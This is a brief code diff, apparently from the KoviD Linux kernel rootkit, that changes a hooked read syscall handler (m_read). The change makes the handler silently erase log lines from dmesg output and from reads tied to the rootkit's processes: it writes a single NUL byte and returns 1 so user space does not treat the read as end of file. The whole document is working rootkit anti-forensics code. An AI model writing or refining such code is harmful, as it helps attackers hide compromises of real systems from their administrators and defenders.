@@ -290,23 +290,13 @@ static asmlinkage long m_read(struct pt_regs *regs)
 		// if KoviD is here, skip
 		if (is_dmesg ||
 		    is_sys_parent((unsigned int)PT_REGS_PARM1(regs))) {
-			// We'll add a new line
-			// without any timestamp
-			const char *obuf = "\n";
-			size_t olen = strlen(obuf);
-
-			if (olen > rv)
-				olen = rv;
-
-			if (copy_to_user((char __user *)arg, obuf, olen))
+			// Remove entire line
+			if (copy_to_user((char __user *)arg, "\0", 1))
 				goto leave;
 
-			if (olen < rv) {
-				if (copy_to_user((char __user *)arg + olen,
-						 "\0", 1))
-					goto leave;
-			}
-			rv = olen;
+			// Return 1, otherwise user-space will
+			// think it's end of file and close it.
+			rv = 1;
 		}
 	}
 leave:
